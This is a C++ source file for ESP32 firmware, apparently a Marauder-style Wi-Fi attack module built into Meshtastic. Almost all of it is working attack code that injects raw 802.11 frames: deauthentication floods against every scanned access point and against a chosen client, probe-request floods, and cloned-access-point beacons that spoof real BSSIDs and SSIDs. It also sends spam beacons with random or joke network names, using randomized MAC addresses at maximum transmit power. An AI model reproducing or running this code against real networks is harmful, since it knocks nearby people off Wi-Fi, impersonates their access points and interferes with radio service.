#include "marauder/WifiAttackController.h"

#if HAS_WIFI && defined(ARCH_ESP32)

#include "configuration.h"
#include "mesh/NodeDB.h"
#include "mesh/wifi/WiFiAPClient.h"

#include <Arduino.h>
#include <WiFi.h>
#include <algorithm>
#include <array>
#include <cstring>
#include <esp_random.h>
#include <esp_wifi.h>

namespace marauder
{
namespace
{
constexpr uint32_t kDefaultTickMs = 5;
constexpr uint32_t kScanStaleMs = 15000;
constexpr uint32_t kRateLogIntervalMs = 1000;
constexpr uint8_t kDefaultChannel = 1;

constexpr size_t kBeaconBurstPerTick = 6;
constexpr size_t kProbeBurstPerTick = 20;
constexpr size_t kDeauthBurstPerTick = 25;

constexpr char kAlphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789-=[];',./`\\_+{}:\"<>?~|!@#$%^&*()";

const char *kRickRollLyrics[] = {
    "01 Never gonna give you up",
    "02 Never gonna let you down",
    "03 Never gonna run around",
    "04 and desert you",
    "05 Never gonna make you cry",
    "06 Never gonna say goodbye",
    "07 Never gonna tell a lie",
    "08 and hurt you"};

const char *kFunnyBeacons[] = {
    "Abraham Linksys",
    "Benjamin FrankLAN",
    "Dora the Internet Explorer",
    "FBI Surveillance Van 4",
    "Get Off My LAN",
    "Loading...",
    "Martin Router King",
    "404 Wi-Fi Unavailable",
    "Test Wi-Fi Please Ignore",
    "This LAN is My LAN",
    "Titanic Syncing",
    "Winternet is Coming"};

std::array<uint8_t, 128> beaconTemplate = {
    0x80, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0xc0, 0x6c,
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
    0x00, 0x00, // SSID tag + length placeholder
};

const uint8_t beaconRates[] = {
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
    0x03, 0x01, 0x04};

std::array<uint8_t, 66> probeTemplate = {
    0x40, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x01, 0x00,
    0x00,
    0x00};

std::array<uint8_t, 26> deauthTemplate = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00};

inline uint8_t randomByte()
{
    return static_cast<uint8_t>(esp_random() & 0xFF);
}

inline uint64_t macKey(const std::array<uint8_t, 6> &mac)
{
    uint64_t key = 0;
    for (auto b : mac) {
        key <<= 8;
        key |= b;
    }
    return key;
}

void randomizeMac(uint8_t *addr)
{
    for (int i = 0; i < 6; ++i)
        addr[i] = randomByte();
    addr[0] &= 0xFE; // unicast
    addr[0] |= 0x02; // locally administered
}

void copyMac(uint8_t *dest, const std::array<uint8_t, 6> &src)
{
    std::memcpy(dest, src.data(), src.size());
}

uint8_t safeChannel(uint8_t channel)
{
    if (channel == 0 || channel > 13)
        return kDefaultChannel;
    return channel;
}
} // namespace

struct WifiAttackController::AccessPointInfo
{
    std::array<uint8_t, 6> bssid{};
    std::string ssid;
    uint8_t channel = kDefaultChannel;
    wifi_auth_mode_t auth = WIFI_AUTH_OPEN;
    bool selected = true;
};

WifiAttackController &WifiAttackController::instance()
{
    static WifiAttackController controller;
    return controller;
}

WifiAttackController::WifiAttackController() : concurrency::OSThread("WifiAttacks")
{
    setInterval(INT32_MAX);
    accessPoints.reserve(32);
}

bool WifiAttackController::toggle(WifiAttackType type)
{
    if (active && currentMode == type) {
        stop();
        return false;
    }
    return start(type);
}

bool WifiAttackController::start(WifiAttackType type)
{
    stop();

    if (!prepareEnvironment(type)) {
        LOG_WARN("WiFi attack \"%s\" unavailable (env init failed)", wifiAttackLabel(type));
        restoreWifiState();
        return false;
    }

    if (!isAttackImplemented(type)) {
        LOG_WARN("WiFi attack \"%s\" not implemented yet", wifiAttackLabel(type));
        restoreWifiState();
        return false;
    }

    if (!prepareTransceiver()) {
        LOG_ERROR("WiFi attack \"%s\" failed to init radio", wifiAttackLabel(type));
        restoreWifiState();
        return false;
    }

    currentMode = type;
    packetsSent = 0;
    rollingApIndex = 0;
    active = true;
    lastTickMs = millis();
    lastRateLogMs = lastTickMs;
    setInterval(kDefaultTickMs);
    LOG_INFO("WiFi attack started: %s", wifiAttackLabel(type));
    return true;
}

void WifiAttackController::stop()
{
    if (!active && previousWifiMode == WIFI_MODE_NULL)
        return;

    active = false;
    setInterval(INT32_MAX);
    teardownAttackState();
    restoreWifiState();
    hasPreferredTarget = false;
    hasPreferredStation = false;
    LOG_INFO("WiFi attack controller idle");
}

void WifiAttackController::setPreferredTarget(const std::array<uint8_t, 6> &bssid, uint8_t channel)
{
    preferredBssid = bssid;
    preferredChannel = channel;
    hasPreferredTarget = true;
    if (!hasPreferredStation)
        LOG_INFO("WiFi attack preferred AP set (ch%u)", channel);
}

void WifiAttackController::setPreferredStation(const std::array<uint8_t, 6> &bssid,
                                               const std::array<uint8_t, 6> &station,
                                               uint8_t channel)
{
    setPreferredTarget(bssid, channel);
    preferredStation = station;
    hasPreferredStation = true;
    LOG_INFO("WiFi attack station target set (ch%u)", channel);
}

bool WifiAttackController::prepareEnvironment(WifiAttackType type)
{
    previousWifiMode = WiFi.getMode();
    restartClientWifi = config.network.wifi_enabled && config.network.wifi_ssid[0];

    if (isAttackImplemented(type)) {
        if (!ensureAccessPointSnapshot(kScanStaleMs)) {
            return type == WifiAttackType::BeaconRandom || type == WifiAttackType::FunnyBeacon ||
                   type == WifiAttackType::RickRollBeacon;
        }
    }

    return true;
}

bool WifiAttackController::ensureAccessPointSnapshot(uint32_t maxAgeMs)
{
    uint32_t now = millis();
    if (accessPoints.empty() || (now - lastScanMs) > maxAgeMs)
        return refreshAccessPoints();
    return true;
}

bool WifiAttackController::refreshAccessPoints()
{
    accessPoints.clear();
    apIndexByKey.clear();

    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect(true, true);
    delay(50);

    int networks = WiFi.scanNetworks(/*async*/ false, /*show_hidden*/ true);
    if (networks <= 0) {
        WiFi.scanDelete();
        lastScanMs = millis();
        return false;
    }

    for (int i = 0; i < networks; ++i) {
        auto *bssid = WiFi.BSSID(i);
        if (!bssid)
            continue;

        AccessPointInfo ap;
        std::memcpy(ap.bssid.data(), bssid, ap.bssid.size());
        ap.ssid = WiFi.SSID(i).c_str();
        ap.channel = safeChannel(WiFi.channel(i));
        ap.auth = static_cast<wifi_auth_mode_t>(WiFi.encryptionType(i));
        ap.selected = true;

        apIndexByKey.emplace(macKey(ap.bssid), accessPoints.size());
        accessPoints.push_back(std::move(ap));
    }

    WiFi.scanDelete();
    lastScanMs = millis();

    if (accessPoints.empty())
        LOG_WARN("WiFi attack: scan returned zero access points");
    else if (hasPreferredTarget) {
        uint64_t key = macKey(preferredBssid);
        auto it = apIndexByKey.find(key);
        if (it != apIndexByKey.end()) {
            size_t idx = it->second;
            if (idx != 0 && idx < accessPoints.size()) {
                auto preferKey = key;
                auto otherKey = macKey(accessPoints[0].bssid);
                std::swap(accessPoints[0], accessPoints[idx]);
                apIndexByKey[preferKey] = 0;
                apIndexByKey[otherKey] = idx;
            }
            rollingApIndex = 0;
            LOG_INFO("WiFi attack prioritizing selected target (ch%u)", accessPoints[0].channel);
        } else {
            LOG_INFO("Preferred WiFi target not found in scan results");
        }
    }

    return !accessPoints.empty();
}

bool WifiAttackController::prepareTransceiver()
{
    WiFi.mode(WIFI_MODE_AP);
    wifi_config_t apConfig = {};
    std::snprintf(reinterpret_cast<char *>(apConfig.ap.ssid), sizeof(apConfig.ap.ssid), "Meshtastic");
    apConfig.ap.ssid_len = 0;
    apConfig.ap.channel = kDefaultChannel;
    apConfig.ap.max_connection = 1;
    apConfig.ap.authmode = WIFI_AUTH_OPEN;
    apConfig.ap.ssid_hidden = 1;
    apConfig.ap.beacon_interval = 600;

    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &apConfig);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_max_tx_power(82);

    return true;
}

void WifiAttackController::restoreWifiState()
{
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_NULL);

    if (restartClientWifi)
        initWifi();
    else
        WiFi.mode(previousWifiMode);

    previousWifiMode = WIFI_MODE_NULL;
}

void WifiAttackController::teardownAttackState()
{
    accessPoints.clear();
    apIndexByKey.clear();
}

int32_t WifiAttackController::runOnce()
{
    if (!active)
        return INT32_MAX;

    uint32_t now = millis();
    handleAttackTick(now);
    updateRateStats(now);
    return kDefaultTickMs;
}

void WifiAttackController::handleAttackTick(uint32_t)
{
    switch (currentMode) {
    case WifiAttackType::BeaconList:
        handleBeaconList();
        break;
    case WifiAttackType::BeaconRandom:
        handleBeaconRandom();
        break;
    case WifiAttackType::FunnyBeacon:
        handleFunnyBeacon();
        break;
    case WifiAttackType::RickRollBeacon:
        handleRickRoll();
        break;
    case WifiAttackType::ProbeFlood:
        handleProbeFlood();
        break;
    case WifiAttackType::DeauthFlood:
        handleDeauthFlood();
        break;
    case WifiAttackType::ApCloneSpam:
        handleApClone();
        break;
    case WifiAttackType::DeauthTargeted:
        if (hasPreferredStation)
            handleDeauthTargeted();
        else
            LOG_WARN("No station selected for Deauth Targeted");
        break;
    case WifiAttackType::BadMsgTargeted:
        if (hasPreferredStation)
            handleBadMsgTargeted();
        else
            LOG_WARN("No station selected for Bad Msg Targeted");
        break;
    case WifiAttackType::AssocSleepTargeted:
        if (hasPreferredStation)
            handleAssocSleepTargeted();
        else
            LOG_WARN("No station selected for Assoc Sleep Targeted");
        break;
    default:
        handleNotSupported();
        break;
    }
}

void WifiAttackController::handleBeaconList()
{
    if (accessPoints.empty())
        return;

    for (size_t i = 0; i < kBeaconBurstPerTick; ++i) {
        const AccessPointInfo &ap = accessPoints[rollingApIndex];
        rollingApIndex = (rollingApIndex + 1) % accessPoints.size();

        auto frame = beaconTemplate;
        copyMac(&frame[10], ap.bssid);
        copyMac(&frame[16], ap.bssid);
        frame[37] = static_cast<uint8_t>(std::min<size_t>(ap.ssid.size(), 31));
        std::memcpy(&frame[38], ap.ssid.data(), frame[37]);
        std::memcpy(&frame[38 + frame[37]], beaconRates, sizeof(beaconRates));
        uint8_t channel = safeChannel(ap.channel);
        frame[50 + frame[37]] = channel;
        setChannel(channel);
        esp_wifi_80211_tx(WIFI_IF_AP, frame.data(), 38 + frame[37] + sizeof(beaconRates), false);
        packetsSent++;
    }
}

void WifiAttackController::handleBeaconRandom()
{
    char ssid[10] = {};
    for (size_t burst = 0; burst < kBeaconBurstPerTick; ++burst) {
        size_t len = 6;
        for (size_t i = 0; i < len; ++i)
            ssid[i] = kAlphabet[randomByte() % (sizeof(kAlphabet) - 1)];

        auto frame = beaconTemplate;
        randomizeMac(&frame[10]);
        randomizeMac(&frame[16]);
        frame[37] = static_cast<uint8_t>(len);
        std::memcpy(&frame[38], ssid, len);
        std::memcpy(&frame[38 + len], beaconRates, sizeof(beaconRates));
        uint8_t channel = safeChannel(randomByte() % 11 + 1);
        frame[50 + len] = channel;
        setChannel(channel);
        esp_wifi_80211_tx(WIFI_IF_AP, frame.data(), 38 + len + sizeof(beaconRates), false);
        packetsSent++;
    }
}

void WifiAttackController::handleFunnyBeacon()
{
    static size_t idx = 0;
    auto frame = beaconTemplate;
    const char *text = kFunnyBeacons[idx];
    idx = (idx + 1) % (sizeof(kFunnyBeacons) / sizeof(kFunnyBeacons[0]));
    size_t len = std::min<size_t>(std::strlen(text), 31);
    randomizeMac(&frame[10]);
    randomizeMac(&frame[16]);
    frame[37] = static_cast<uint8_t>(len);
    std::memcpy(&frame[38], text, len);
    std::memcpy(&frame[38 + len], beaconRates, sizeof(beaconRates));
    uint8_t channel = safeChannel(randomByte() % 11 + 1);
    frame[50 + len] = channel;
    setChannel(channel);
    esp_wifi_80211_tx(WIFI_IF_AP, frame.data(), 38 + len + sizeof(beaconRates), false);
    packetsSent++;
}

void WifiAttackController::handleRickRoll()
{
    static size_t idx = 0;
    const char *line = kRickRollLyrics[idx];
    idx = (idx + 1) % (sizeof(kRickRollLyrics) / sizeof(kRickRollLyrics[0]));
    size_t len = std::min<size_t>(std::strlen(line), 31);

    auto frame = beaconTemplate;
    randomizeMac(&frame[10]);
    randomizeMac(&frame[16]);
    frame[37] = static_cast<uint8_t>(len);
    std::memcpy(&frame[38], line, len);
    std::memcpy(&frame[38 + len], beaconRates, sizeof(beaconRates));
    uint8_t channel = safeChannel(randomByte() % 11 + 1);
    frame[50 + len] = channel;
    setChannel(channel);
    esp_wifi_80211_tx(WIFI_IF_AP, frame.data(), 38 + len + sizeof(beaconRates), false);
    packetsSent++;
}

void WifiAttackController::handleProbeFlood()
{
    if (accessPoints.empty())
        return;

    for (size_t burst = 0; burst < kProbeBurstPerTick; ++burst) {
        const AccessPointInfo &ap = accessPoints[rollingApIndex];
        rollingApIndex = (rollingApIndex + 1) % accessPoints.size();

        auto frame = probeTemplate;
        randomizeMac(&frame[10]);
        frame[24] = static_cast<uint8_t>(std::min<size_t>(ap.ssid.size(), 31));
        std::memcpy(&frame[25], ap.ssid.data(), frame[24]);
        std::memcpy(&frame[25 + frame[24]], beaconRates, sizeof(beaconRates));
        setChannel(safeChannel(ap.channel));
        esp_wifi_80211_tx(WIFI_IF_AP, frame.data(), 25 + frame[24] + sizeof(beaconRates), false);
        packetsSent++;
    }
}

void WifiAttackController::handleDeauthFlood()
{
    if (accessPoints.empty())
        return;

    for (size_t burst = 0; burst < kDeauthBurstPerTick; ++burst) {
        const AccessPointInfo &ap = accessPoints[randomByte() % accessPoints.size()];
        auto frame = deauthTemplate;
        randomizeMac(&frame[4]);
        copyMac(&frame[10], ap.bssid);
        copyMac(&frame[16], ap.bssid);
        setChannel(safeChannel(ap.channel));
        esp_wifi_80211_tx(WIFI_IF_AP, frame.data(), frame.size(), false);
        packetsSent++;
    }
}

void WifiAttackController::handleApClone()
{
    if (accessPoints.empty())
        return;

    for (size_t burst = 0; burst < kBeaconBurstPerTick; ++burst) {
        const AccessPointInfo &ap = accessPoints[rollingApIndex];
        rollingApIndex = (rollingApIndex + 1) % accessPoints.size();

        auto frame = beaconTemplate;
        copyMac(&frame[10], ap.bssid);
        copyMac(&frame[16], ap.bssid);
        frame[37] = static_cast<uint8_t>(std::min<size_t>(ap.ssid.size(), 31));
        std::memcpy(&frame[38], ap.ssid.data(), frame[37]);
        std::memcpy(&frame[38 + frame[37]], beaconRates, sizeof(beaconRates));
        frame[50 + frame[37]] = safeChannel(ap.channel);
        setChannel(safeChannel(ap.channel));
        esp_wifi_80211_tx(WIFI_IF_AP, frame.data(), 38 + frame[37] + sizeof(beaconRates), false);
        packetsSent++;
    }
}

void WifiAttackController::handleDeauthTargeted()
{
    if (!hasPreferredStation)
        return;
    for (size_t i = 0; i < kDeauthBurstPerTick; ++i) {
        auto frame = deauthTemplate;
        copyMac(&frame[4], preferredStation);
        copyMac(&frame[10], preferredBssid);
        copyMac(&frame[16], preferredBssid);
        setChannel(safeChannel(preferredChannel));
        esp_wifi_80211_tx(WIFI_IF_AP, frame.data(), frame.size(), false);
        packetsSent++;
    }
}

void WifiAttackController::handleBadMsgTargeted()
{
    handleDeauthTargeted();
}

void WifiAttackController::handleAssocSleepTargeted()
{
    handleDeauthTargeted();
}
void WifiAttackController::handleNotSupported()
{
    LOG_WARN("WiFi attack \"%s\" is not implemented yet", wifiAttackLabel(currentMode));
    stop();
}

void WifiAttackController::setChannel(uint8_t channel)
{
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

void WifiAttackController::updateRateStats(uint32_t nowMs)
{
    if ((nowMs - lastRateLogMs) >= kRateLogIntervalMs) {
        LOG_INFO("WiFi attack %s: %lu frames/s", wifiAttackLabel(currentMode), static_cast<unsigned long>(packetsSent));
        packetsSent = 0;
        lastRateLogMs = nowMs;
    }
}

bool WifiAttackController::isAttackImplemented(WifiAttackType type) const
{
    switch (type) {
    case WifiAttackType::BeaconList:
    case WifiAttackType::BeaconRandom:
    case WifiAttackType::FunnyBeacon:
    case WifiAttackType::RickRollBeacon:
    case WifiAttackType::ProbeFlood:
    case WifiAttackType::DeauthFlood:
    case WifiAttackType::ApCloneSpam:
    case WifiAttackType::DeauthTargeted:
    case WifiAttackType::BadMsgTargeted:
    case WifiAttackType::AssocSleepTargeted:
        return true;
    default:
        return false;
    }
}

} // namespace marauder

#endif

